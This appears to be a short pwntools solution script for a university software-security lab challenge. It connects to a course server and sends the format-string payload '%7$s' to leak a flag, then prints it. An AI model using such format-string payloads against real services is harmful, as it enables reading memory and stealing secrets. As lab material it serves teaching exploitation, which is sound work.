import pwn

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23192

remote = pwn.remote(SERVER, PORT, timeout=10000)

buffer = b"%7$s"

remote.sendline(buffer)
flag = remote.recvline_contains(b"SSof")
print(flag.decode())